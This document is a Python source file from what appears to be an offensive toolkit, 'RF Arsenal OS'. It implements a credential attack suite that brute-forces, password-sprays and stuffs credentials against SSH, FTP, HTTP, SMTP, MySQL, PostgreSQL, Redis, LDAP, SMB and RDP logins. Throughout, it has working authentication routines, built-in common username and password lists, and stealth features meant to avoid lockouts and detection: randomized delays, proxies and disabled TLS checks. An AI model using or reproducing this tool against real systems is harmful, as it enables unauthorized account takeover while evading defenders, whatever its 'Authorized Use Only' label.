#!/usr/bin/env python3
"""
RF Arsenal OS - Credential Attack Suite
=======================================

Multi-protocol credential attack framework with stealth-first design.
Supports brute-force, password spraying, and credential stuffing.

STEALTH FEATURES:
- Adaptive timing to avoid lockouts
- Proxy chain support
- Request fingerprint randomization
- RAM-only credential storage
- Lockout detection and avoidance

Author: RF Arsenal Security Team
License: Authorized Use Only
"""

import asyncio
import aiohttp
import base64
import hashlib
import logging
import os
import random
import re
import socket
import ssl
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, AsyncGenerator
from collections import defaultdict

logger = logging.getLogger(__name__)


class Protocol(Enum):
    """Supported attack protocols"""
    SSH = "ssh"
    FTP = "ftp"
    TELNET = "telnet"
    HTTP_BASIC = "http_basic"
    HTTP_FORM = "http_form"
    HTTP_DIGEST = "http_digest"
    SMTP = "smtp"
    POP3 = "pop3"
    IMAP = "imap"
    RDP = "rdp"
    VNC = "vnc"
    SMB = "smb"
    MYSQL = "mysql"
    MSSQL = "mssql"
    POSTGRESQL = "postgresql"
    MONGODB = "mongodb"
    REDIS = "redis"
    LDAP = "ldap"
    SNMP = "snmp"


class AttackMode(Enum):
    """Attack modes"""
    BRUTEFORCE = "bruteforce"
    PASSWORD_SPRAY = "password_spray"
    CREDENTIAL_STUFFING = "credential_stuffing"
    DICTIONARY = "dictionary"


@dataclass
class CredentialResult:
    """Credential attack result"""
    success: bool
    protocol: Protocol
    host: str
    port: int
    username: str
    password: str
    timestamp: datetime = field(default_factory=datetime.now)
    response_time: float = 0.0
    extra_info: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'success': self.success,
            'protocol': self.protocol.value,
            'host': self.host,
            'port': self.port,
            'username': self.username,
            'password': '***' if self.success else self.password,  # Mask successful passwords
            'timestamp': self.timestamp.isoformat(),
            'response_time': self.response_time,
        }


@dataclass
class AttackConfig:
    """Credential attack configuration"""
    # Target settings
    host: str
    port: int
    protocol: Protocol
    
    # Attack settings
    mode: AttackMode = AttackMode.DICTIONARY
    usernames: List[str] = field(default_factory=list)
    passwords: List[str] = field(default_factory=list)
    credentials: List[Tuple[str, str]] = field(default_factory=list)  # For stuffing
    
    # Timing settings (stealth)
    delay_min: float = 1.0
    delay_max: float = 3.0
    lockout_threshold: int = 3
    lockout_wait: float = 300.0  # 5 minutes
    randomize_timing: bool = True
    
    # Connection settings
    timeout: float = 10.0
    threads: int = 5
    use_proxy: bool = False
    proxy_url: Optional[str] = None
    
    # Advanced settings
    stop_on_success: bool = True
    verify_ssl: bool = False
    max_attempts: int = 1000
    
    # HTTP-specific
    http_method: str = "POST"
    http_url: Optional[str] = None
    http_username_field: str = "username"
    http_password_field: str = "password"
    http_success_pattern: Optional[str] = None
    http_failure_pattern: Optional[str] = None
    http_extra_data: Dict[str, str] = field(default_factory=dict)


class CredentialAttacker:
    """
    Multi-Protocol Credential Attack Framework
    
    Features:
    - Brute-force attacks
    - Password spraying (safe against lockouts)
    - Credential stuffing
    - Dictionary attacks
    - Adaptive timing
    - Lockout detection
    
    STEALTH COMPLIANCE:
    - All credentials stored in RAM only
    - Proxy chain support for anonymity
    - Request fingerprint randomization
    - Adaptive timing to avoid detection
    """
    
    # Common username lists
    COMMON_USERNAMES = [
        "admin", "administrator", "root", "user", "test", "guest",
        "info", "mysql", "postgres", "oracle", "ftp", "backup",
        "operator", "manager", "support", "webmaster", "www",
        "sysadmin", "sa", "dba", "service", "daemon", "bin",
    ]
    
    # Common password lists (top passwords)
    COMMON_PASSWORDS = [
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon",
        "baseball", "iloveyou", "master", "sunshine", "ashley",
        "bailey", "shadow", "123123", "654321", "superman",
        "qazwsx", "michael", "football", "password1", "password123",
        "welcome", "welcome1", "admin", "admin123", "root",
        "toor", "pass", "test", "guest", "master123",
    ]
    
    # Default ports for protocols
    DEFAULT_PORTS = {
        Protocol.SSH: 22,
        Protocol.FTP: 21,
        Protocol.TELNET: 23,
        Protocol.HTTP_BASIC: 80,
        Protocol.HTTP_FORM: 80,
        Protocol.HTTP_DIGEST: 80,
        Protocol.SMTP: 25,
        Protocol.POP3: 110,
        Protocol.IMAP: 143,
        Protocol.RDP: 3389,
        Protocol.VNC: 5900,
        Protocol.SMB: 445,
        Protocol.MYSQL: 3306,
        Protocol.MSSQL: 1433,
        Protocol.POSTGRESQL: 5432,
        Protocol.MONGODB: 27017,
        Protocol.REDIS: 6379,
        Protocol.LDAP: 389,
        Protocol.SNMP: 161,
    }
    
    def __init__(self, config: Optional[AttackConfig] = None):
        """Initialize credential attacker"""
        self.config = config
        self.results: List[CredentialResult] = []
        self.successful_creds: List[CredentialResult] = []
        self.failed_attempts: Dict[str, int] = defaultdict(int)
        self.locked_users: Set[str] = set()
        self._running = False
        self._lock = asyncio.Lock()
        self.stats = defaultdict(int)
        
        logger.info("CredentialAttacker initialized - RAM-only operation")
    
    async def _delay(self):
        """Apply randomized delay for stealth"""
        if self.config and self.config.randomize_timing:
            delay = random.uniform(self.config.delay_min, self.config.delay_max)
            await asyncio.sleep(delay)
        elif self.config:
            await asyncio.sleep(self.config.delay_min)
    
    def _check_lockout(self, username: str) -> bool:
        """Check if user is locked out"""
        if username in self.locked_users:
            return True
        
        if self.config and self.failed_attempts[username] >= self.config.lockout_threshold:
            self.locked_users.add(username)
            logger.warning(f"User '{username}' locked out after {self.config.lockout_threshold} failures")
            return True
        
        return False
    
    async def attack(
        self,
        host: str,
        port: int,
        protocol: Protocol,
        config: Optional[AttackConfig] = None
    ) -> List[CredentialResult]:
        """
        Run credential attack
        
        Args:
            host: Target host
            port: Target port
            protocol: Protocol to attack
            config: Attack configuration
            
        Returns:
            List of results (successful credentials)
        """
        if config:
            self.config = config
        elif not self.config:
            self.config = AttackConfig(host=host, port=port, protocol=protocol)
        
        self.config.host = host
        self.config.port = port
        self.config.protocol = protocol
        
        self._running = True
        self.results = []
        self.successful_creds = []
        self.failed_attempts = defaultdict(int)
        self.locked_users = set()
        
        logger.info(f"Starting {self.config.mode.value} attack on {protocol.value}://{host}:{port}")
        
        # Get credentials to test
        credentials = self._get_credentials()
        
        # Run attack based on mode
        if self.config.mode == AttackMode.PASSWORD_SPRAY:
            await self._password_spray(credentials)
        elif self.config.mode == AttackMode.CREDENTIAL_STUFFING:
            await self._credential_stuff()
        else:
            await self._dictionary_attack(credentials)
        
        logger.info(f"Attack complete. Found {len(self.successful_creds)} valid credentials")
        return self.successful_creds
    
    def _get_credentials(self) -> List[Tuple[str, str]]:
        """Get list of credentials to test"""
        if self.config.credentials:
            return self.config.credentials
        
        usernames = self.config.usernames or self.COMMON_USERNAMES
        passwords = self.config.passwords or self.COMMON_PASSWORDS
        
        credentials = []
        for user in usernames:
            for password in passwords:
                credentials.append((user, password))
        
        return credentials[:self.config.max_attempts]
    
    async def _dictionary_attack(self, credentials: List[Tuple[str, str]]):
        """Standard dictionary attack"""
        semaphore = asyncio.Semaphore(self.config.threads)
        
        async def test_credential(user: str, password: str):
            async with semaphore:
                if not self._running:
                    return
                
                if self._check_lockout(user):
                    return
                
                await self._delay()
                result = await self._try_credential(user, password)
                
                if result.success:
                    async with self._lock:
                        self.successful_creds.append(result)
                        if self.config.stop_on_success:
                            self._running = False
                else:
                    self.failed_attempts[user] += 1
                
                self.stats['attempts'] += 1
        
        tasks = [test_credential(user, password) for user, password in credentials]
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _password_spray(self, credentials: List[Tuple[str, str]]):
        """
        Password spray attack
        
        Tests one password against all users before moving to next password.
        Safer against account lockouts.
        """
        # Group credentials by password
        passwords_users = defaultdict(list)
        for user, password in credentials:
            passwords_users[password].append(user)
        
        for password, users in passwords_users.items():
            if not self._running:
                break
            
            logger.info(f"Spraying password across {len(users)} users")
            
            for user in users:
                if not self._running:
                    break
                
                if self._check_lockout(user):
                    continue
                
                await self._delay()
                result = await self._try_credential(user, password)
                
                if result.success:
                    async with self._lock:
                        self.successful_creds.append(result)
                        if self.config.stop_on_success:
                            self._running = False
                else:
                    self.failed_attempts[user] += 1
                
                self.stats['attempts'] += 1
            
            # Wait between password rounds to avoid lockouts
            if self._running:
                logger.info(f"Waiting {self.config.lockout_wait}s before next password...")
                await asyncio.sleep(min(self.config.lockout_wait / 10, 30))
    
    async def _credential_stuff(self):
        """Credential stuffing with known username:password pairs"""
        if not self.config.credentials:
            logger.warning("No credentials provided for stuffing")
            return
        
        semaphore = asyncio.Semaphore(self.config.threads)
        
        async def test_cred(user: str, password: str):
            async with semaphore:
                if not self._running:
                    return
                
                await self._delay()
                result = await self._try_credential(user, password)
                
                if result.success:
                    async with self._lock:
                        self.successful_creds.append(result)
                
                self.stats['attempts'] += 1
        
        tasks = [test_cred(user, password) for user, password in self.config.credentials]
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _try_credential(self, username: str, password: str) -> CredentialResult:
        """
        Try a single credential
        
        Dispatches to protocol-specific handlers
        """
        protocol = self.config.protocol
        
        start_time = time.time()
        
        try:
            if protocol == Protocol.SSH:
                success, extra = await self._try_ssh(username, password)
            elif protocol == Protocol.FTP:
                success, extra = await self._try_ftp(username, password)
            elif protocol in [Protocol.HTTP_BASIC, Protocol.HTTP_FORM, Protocol.HTTP_DIGEST]:
                success, extra = await self._try_http(username, password)
            elif protocol == Protocol.SMTP:
                success, extra = await self._try_smtp(username, password)
            elif protocol == Protocol.MYSQL:
                success, extra = await self._try_mysql(username, password)
            elif protocol == Protocol.POSTGRESQL:
                success, extra = await self._try_postgresql(username, password)
            elif protocol == Protocol.REDIS:
                success, extra = await self._try_redis(password)
            elif protocol == Protocol.LDAP:
                success, extra = await self._try_ldap(username, password)
            elif protocol == Protocol.SMB:
                success, extra = await self._try_smb(username, password)
            elif protocol == Protocol.RDP:
                success, extra = await self._try_rdp(username, password)
            else:
                logger.warning(f"Protocol {protocol.value} not yet implemented")
                success, extra = False, {}
                
        except Exception as e:
            logger.debug(f"Error testing {username}:{password} - {e}")
            success, extra = False, {'error': str(e)}
        
        response_time = time.time() - start_time
        
        result = CredentialResult(
            success=success,
            protocol=protocol,
            host=self.config.host,
            port=self.config.port,
            username=username,
            password=password,
            response_time=response_time,
            extra_info=extra,
        )
        
        if success:
            logger.info(f"[SUCCESS] {protocol.value}://{username}@{self.config.host}")
            self.stats['successes'] += 1
        else:
            self.stats['failures'] += 1
        
        return result
    
    async def _try_ssh(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try SSH authentication"""
        try:
            import asyncssh
            
            async with asyncssh.connect(
                self.config.host,
                port=self.config.port,
                username=username,
                password=password,
                known_hosts=None,
                connect_timeout=self.config.timeout,
            ) as conn:
                return True, {'banner': conn.get_extra_info('server_version', '')}
                
        except ImportError:
            # Fallback to socket-based detection
            return await self._try_ssh_socket(username, password)
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_ssh_socket(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Socket-based SSH authentication attempt"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.host, self.config.port),
                timeout=self.config.timeout
            )
            
            # Read banner
            banner = await asyncio.wait_for(reader.readline(), timeout=5)
            banner_str = banner.decode('utf-8', errors='ignore').strip()
            
            writer.close()
            await writer.wait_closed()
            
            # We can't actually authenticate without paramiko/asyncssh
            # Return False but include banner info
            return False, {'banner': banner_str, 'note': 'SSH library not available'}
            
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_ftp(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try FTP authentication"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.host, self.config.port),
                timeout=self.config.timeout
            )
            
            # Read banner
            banner = await asyncio.wait_for(reader.readline(), timeout=5)
            
            # Send USER
            writer.write(f"USER {username}\r\n".encode())
            await writer.drain()
            response = await asyncio.wait_for(reader.readline(), timeout=5)
            
            # Send PASS
            writer.write(f"PASS {password}\r\n".encode())
            await writer.drain()
            response = await asyncio.wait_for(reader.readline(), timeout=5)
            response_str = response.decode('utf-8', errors='ignore')
            
            writer.write(b"QUIT\r\n")
            await writer.drain()
            
            writer.close()
            await writer.wait_closed()
            
            # Check for success (230 = logged in)
            if response_str.startswith('230'):
                return True, {'banner': banner.decode('utf-8', errors='ignore').strip()}
            
            return False, {'response': response_str.strip()}
            
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_http(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try HTTP authentication"""
        try:
            ssl_context = ssl.create_default_context()
            if not self.config.verify_ssl:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
            
            connector = aiohttp.TCPConnector(ssl=ssl_context)
            timeout = aiohttp.ClientTimeout(total=self.config.timeout)
            
            url = self.config.http_url or f"http://{self.config.host}:{self.config.port}/"
            
            # Configure proxy if enabled
            proxy = None
            if self.config.use_proxy and self.config.proxy_url:
                proxy = self.config.proxy_url
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                if self.config.protocol == Protocol.HTTP_BASIC:
                    # Basic authentication
                    auth = aiohttp.BasicAuth(username, password)
                    async with session.get(url, auth=auth, proxy=proxy) as response:
                        if response.status == 200:
                            return True, {'status': response.status}
                        elif response.status == 401:
                            return False, {'status': response.status}
                        else:
                            return False, {'status': response.status}
                
                elif self.config.protocol == Protocol.HTTP_FORM:
                    # Form-based authentication
                    data = {
                        self.config.http_username_field: username,
                        self.config.http_password_field: password,
                    }
                    data.update(self.config.http_extra_data)
                    
                    if self.config.http_method.upper() == "POST":
                        async with session.post(url, data=data, proxy=proxy) as response:
                            text = await response.text()
                            
                            # Check success/failure patterns
                            if self.config.http_success_pattern:
                                if re.search(self.config.http_success_pattern, text):
                                    return True, {'status': response.status}
                            
                            if self.config.http_failure_pattern:
                                if re.search(self.config.http_failure_pattern, text):
                                    return False, {'status': response.status}
                            
                            # Default: check for redirect or 200
                            if response.status in [200, 302, 303]:
                                # Could be success, need patterns to confirm
                                return False, {'status': response.status, 'note': 'Need patterns'}
                            
                            return False, {'status': response.status}
            
            return False, {}
            
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_smtp(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try SMTP authentication"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.host, self.config.port),
                timeout=self.config.timeout
            )
            
            # Read banner
            banner = await asyncio.wait_for(reader.readline(), timeout=5)
            
            # EHLO
            writer.write(b"EHLO localhost\r\n")
            await writer.drain()
            
            # Read EHLO response (multiple lines)
            response = b""
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=5)
                response += line
                if line[3:4] == b' ':  # Last line has space after code
                    break
            
            # AUTH LOGIN
            writer.write(b"AUTH LOGIN\r\n")
            await writer.drain()
            await asyncio.wait_for(reader.readline(), timeout=5)
            
            # Send username (base64)
            writer.write(base64.b64encode(username.encode()) + b"\r\n")
            await writer.drain()
            await asyncio.wait_for(reader.readline(), timeout=5)
            
            # Send password (base64)
            writer.write(base64.b64encode(password.encode()) + b"\r\n")
            await writer.drain()
            response = await asyncio.wait_for(reader.readline(), timeout=5)
            
            writer.write(b"QUIT\r\n")
            await writer.drain()
            
            writer.close()
            await writer.wait_closed()
            
            response_str = response.decode('utf-8', errors='ignore')
            
            # 235 = Authentication successful
            if response_str.startswith('235'):
                return True, {'banner': banner.decode('utf-8', errors='ignore').strip()}
            
            return False, {'response': response_str.strip()}
            
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_mysql(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try MySQL authentication"""
        try:
            import aiomysql
            
            conn = await aiomysql.connect(
                host=self.config.host,
                port=self.config.port,
                user=username,
                password=password,
                connect_timeout=int(self.config.timeout),
            )
            
            version = conn.get_server_info()
            conn.close()
            
            return True, {'version': version}
            
        except ImportError:
            return False, {'error': 'aiomysql not installed'}
        except Exception as e:
            error_str = str(e)
            if 'Access denied' in error_str:
                return False, {'error': 'Access denied'}
            return False, {'error': error_str}
    
    async def _try_postgresql(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try PostgreSQL authentication"""
        try:
            import asyncpg
            
            conn = await asyncpg.connect(
                host=self.config.host,
                port=self.config.port,
                user=username,
                password=password,
                timeout=self.config.timeout,
            )
            
            version = await conn.fetchval('SELECT version()')
            await conn.close()
            
            return True, {'version': version}
            
        except ImportError:
            return False, {'error': 'asyncpg not installed'}
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_redis(self, password: str) -> Tuple[bool, Dict]:
        """Try Redis authentication"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.host, self.config.port),
                timeout=self.config.timeout
            )
            
            # AUTH command
            writer.write(f"AUTH {password}\r\n".encode())
            await writer.drain()
            response = await asyncio.wait_for(reader.readline(), timeout=5)
            response_str = response.decode('utf-8', errors='ignore').strip()
            
            if response_str == '+OK':
                # Get INFO
                writer.write(b"INFO server\r\n")
                await writer.drain()
                info = await asyncio.wait_for(reader.read(1024), timeout=5)
                
                writer.write(b"QUIT\r\n")
                await writer.drain()
                
                writer.close()
                await writer.wait_closed()
                
                return True, {'info': info.decode('utf-8', errors='ignore')[:200]}
            
            writer.close()
            await writer.wait_closed()
            
            return False, {'response': response_str}
            
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_ldap(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try LDAP authentication"""
        try:
            import ldap3
            
            server = ldap3.Server(self.config.host, port=self.config.port)
            conn = ldap3.Connection(
                server,
                user=username,
                password=password,
                auto_bind=True,
                receive_timeout=self.config.timeout,
            )
            
            conn.unbind()
            return True, {}
            
        except ImportError:
            return False, {'error': 'ldap3 not installed'}
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_smb(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try SMB authentication"""
        try:
            from impacket.smbconnection import SMBConnection
            
            conn = SMBConnection(self.config.host, self.config.host, timeout=int(self.config.timeout))
            conn.login(username, password)
            
            shares = conn.listShares()
            share_names = [s['shi1_netname'] for s in shares]
            
            conn.close()
            return True, {'shares': share_names}
            
        except ImportError:
            return False, {'error': 'impacket not installed'}
        except Exception as e:
            return False, {'error': str(e)}
    
    async def _try_rdp(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Try RDP authentication (basic check)"""
        try:
            # RDP requires complex protocol handling
            # This is a basic connectivity check
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.host, self.config.port),
                timeout=self.config.timeout
            )
            
            # Send RDP connection request
            # X.224 Connection Request
            tpkt = bytes([3, 0, 0, 11])  # TPKT header
            x224 = bytes([6, 0xe0, 0, 0, 0, 0, 0])  # X.224 CR
            
            writer.write(tpkt + x224)
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=5)
            
            writer.close()
            await writer.wait_closed()
            
            # Basic check - RDP service responded
            if len(response) > 0:
                return False, {'note': 'RDP service active, full auth check requires aardwolf/rdpy'}
            
            return False, {'error': 'No response'}
            
        except Exception as e:
            return False, {'error': str(e)}
    
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        return {
            'total_attempts': self.stats['attempts'],
            'successes': self.stats['successes'],
            'failures': self.stats['failures'],
            'locked_users': len(self.locked_users),
            'credentials_found': len(self.successful_creds),
        }
    
    def get_successful_credentials(self) -> List[Dict]:
        """Get list of successful credentials"""
        return [cred.to_dict() for cred in self.successful_creds]
    
    def stop(self):
        """Stop running attack"""
        self._running = False
    
    def clear_results(self):
        """Clear all results from RAM"""
        self.results = []
        self.successful_creds = []
        self.failed_attempts = defaultdict(int)
        self.locked_users = set()
        self.stats = defaultdict(int)
        logger.info("Attack results cleared from RAM")


# Quick attack functions
async def brute_force(
    host: str,
    port: int,
    protocol: Protocol,
    usernames: Optional[List[str]] = None,
    passwords: Optional[List[str]] = None,
    proxy: Optional[str] = None,
) -> List[CredentialResult]:
    """
    Quick brute-force attack
    
    Args:
        host: Target host
        port: Target port
        protocol: Protocol to attack
        usernames: Optional username list
        passwords: Optional password list
        proxy: Optional proxy URL
        
    Returns:
        List of successful credentials
    """
    config = AttackConfig(
        host=host,
        port=port,
        protocol=protocol,
        mode=AttackMode.DICTIONARY,
        usernames=usernames or [],
        passwords=passwords or [],
        use_proxy=bool(proxy),
        proxy_url=proxy,
    )
    
    attacker = CredentialAttacker(config)
    return await attacker.attack(host, port, protocol)


async def password_spray(
    host: str,
    port: int,
    protocol: Protocol,
    usernames: List[str],
    passwords: List[str],
    lockout_wait: float = 300.0,
    proxy: Optional[str] = None,
) -> List[CredentialResult]:
    """
    Password spray attack (safe against lockouts)
    
    Args:
        host: Target host
        port: Target port
        protocol: Protocol to attack
        usernames: List of usernames
        passwords: List of passwords to spray
        lockout_wait: Wait time between password rounds
        proxy: Optional proxy URL
        
    Returns:
        List of successful credentials
    """
    config = AttackConfig(
        host=host,
        port=port,
        protocol=protocol,
        mode=AttackMode.PASSWORD_SPRAY,
        usernames=usernames,
        passwords=passwords,
        lockout_wait=lockout_wait,
        use_proxy=bool(proxy),
        proxy_url=proxy,
    )
    
    attacker = CredentialAttacker(config)
    return await attacker.attack(host, port, protocol)


async def credential_stuff(
    host: str,
    port: int,
    protocol: Protocol,
    credentials: List[Tuple[str, str]],
    proxy: Optional[str] = None,
) -> List[CredentialResult]:
    """
    Credential stuffing attack
    
    Args:
        host: Target host
        port: Target port
        protocol: Protocol to attack
        credentials: List of (username, password) tuples
        proxy: Optional proxy URL
        
    Returns:
        List of successful credentials
    """
    config = AttackConfig(
        host=host,
        port=port,
        protocol=protocol,
        mode=AttackMode.CREDENTIAL_STUFFING,
        credentials=credentials,
        use_proxy=bool(proxy),
        proxy_url=proxy,
    )
    
    attacker = CredentialAttacker(config)
    return await attacker.attack(host, port, protocol)


if __name__ == "__main__":
    import sys
    
    logging.basicConfig(level=logging.INFO)
    
    print("RF Arsenal OS - Credential Attack Suite")
    print("Use brute_force(), password_spray(), or credential_stuff()")
